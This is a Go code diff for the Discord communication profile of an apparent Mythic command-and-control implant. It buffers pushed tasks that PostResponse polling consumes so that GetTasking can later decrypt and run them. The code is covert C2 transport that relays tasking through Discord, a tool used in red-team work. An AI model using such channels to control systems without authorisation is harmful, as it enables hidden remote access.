@@ -97,6 +97,15 @@ type DiscordProfile struct {
 	// mu protects CallbackUUID updates
 	mu sync.Mutex
 
+	// pendingMessages buffers pushed task messages that were accidentally consumed
+	// during PostResponse polling. The Discord C2 server sets client_id to the
+	// callback UUID for ALL responses (it doesn't echo per-exchange clientIDs),
+	// so sendAndPollAll matches both PostResponse acks and pushed tasks
+	// indiscriminately. PostResponse extracts its ack and buffers the rest here
+	// for GetTasking to drain on the next cycle.
+	pendingMu       sync.Mutex
+	pendingMessages []string // encrypted Mythic message payloads (base64)
+
 	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
 	GetDelegatesOnly     func() []structs.DelegateMessage
 	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
@@ -399,6 +408,42 @@ func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []struct
 	var tasks []structs.Task
 	var inboundSocks []structs.SocksMsg
 
+	// Drain any pushed tasks that PostResponse buffered. PostResponse may
+	// accidentally consume pushed tasks from the channel (the server uses
+	// callback UUID as client_id for ALL messages, making them
+	// indistinguishable at the wrapper level). Those messages are buffered
+	// in pendingMessages and drained here.
+	d.pendingMu.Lock()
+	buffered := d.pendingMessages
+	d.pendingMessages = nil
+	d.pendingMu.Unlock()
+	for _, msg := range buffered {
+		decData, decErr := d.unwrapResponse(msg, cfg.EncryptionKey)
+		if decErr != nil {
+			continue
+		}
+		var taskResp map[string]interface{}
+		if json.Unmarshal(decData, &taskResp) == nil {
+			if taskList, exists := taskResp["tasks"]; exists {
+				if taskArray, ok := taskList.([]interface{}); ok {
+					for _, taskData := range taskArray {
+						if taskMap, ok := taskData.(map[string]interface{}); ok {
+							task := structs.NewTask(
+								getString(taskMap, "id"),
+								getString(taskMap, "command"),
+								getString(taskMap, "parameters"),
+							)
+							tasks = append(tasks, task)
+						}
+					}
+				}
+			}
+		}
+	}
+	if len(buffered) > 0 && d.Debug {
+		log.Printf("GetTasking: drained %d buffered messages, got %d tasks", len(buffered), len(tasks))
+	}
+
 	// Pre-poll sweep: check for any pushed tasks already in the Discord channel
 	// before sending get_tasking. In push C2, Mythic may push tasks between
 	// GetTasking cycles that haven't been collected yet.
@@ -593,17 +638,62 @@ func (d *DiscordProfile) PostResponse(response structs.Response, agent *structs.
 		return nil, err
 	}
 
-	responseData, err := d.sendAndPoll(mythicMessage, activeUUID, cfg)
+	// Use sendAndPollAll to collect ALL matched messages. The Discord C2 server
+	// uses the callback UUID as client_id for every response (it doesn't echo
+	// per-exchange IDs), so pushed tasks and PostResponse acks are
+	// indistinguishable at the wrapper level. We collect all, find our ack,
+	// and buffer any pushed tasks for GetTasking.
+	allResults, err := d.sendAndPollAll(mythicMessage, activeUUID, cfg)
 	if err != nil {
-		// Retry once after a short delay — Discord API may be temporarily slow
 		if d.Debug {
 			log.Printf("PostResponse: first attempt failed: %v, retrying...", err)
 		}
 		time.Sleep(time.Duration(d.PollInterval) * time.Second)
-		responseData, err = d.sendAndPoll(mythicMessage, activeUUID, cfg)
+		allResults, err = d.sendAndPollAll(mythicMessage, activeUUID, cfg)
 		if err != nil {
 			return nil, fmt.Errorf("post response via Discord failed (after retry): %w", err)
 		}
+	}
+
+	// Separate our PostResponse ack from any accidentally consumed pushed tasks.
+	// Pushed tasks contain a non-empty "tasks" array; PostResponse acks don't.
+	var responseData string
+	var extraMessages []string
+	for _, msg := range allResults {
+		decData, decErr := d.unwrapResponse(msg, cfg.EncryptionKey)
+		if decErr != nil {
+			continue
+		}
+		var parsed map[string]interface{}
+		if json.Unmarshal(decData, &parsed) != nil {
+			continue
+		}
+		if taskList, exists := parsed["tasks"]; exists {
+			if taskArray, ok := taskList.([]interface{}); ok && len(taskArray) > 0 {
+				// This is a pushed task, not our PostResponse ack — buffer it
+				extraMessages = append(extraMessages, msg)
+				continue
+			}
+		}
+		if responseData == "" {
+			responseData = msg // First non-task message is our PostResponse ack
+		} else {
+			extraMessages = append(extraMessages, msg) // Extra non-task messages also buffered
+		}
+	}
+
+	// Buffer any accidentally consumed messages for GetTasking to drain
+	if len(extraMessages) > 0 {
+		d.pendingMu.Lock()
+		d.pendingMessages = append(d.pendingMessages, extraMessages...)
+		d.pendingMu.Unlock()
+		if d.Debug {
+			log.Printf("PostResponse: buffered %d pushed messages for GetTasking", len(extraMessages))
+		}
+	}
+
+	if responseData == "" {
+		return nil, fmt.Errorf("no PostResponse ack found among %d matched messages", len(allResults))
 	}
 
 	decryptedData, err := d.unwrapResponse(responseData, cfg.EncryptionKey)
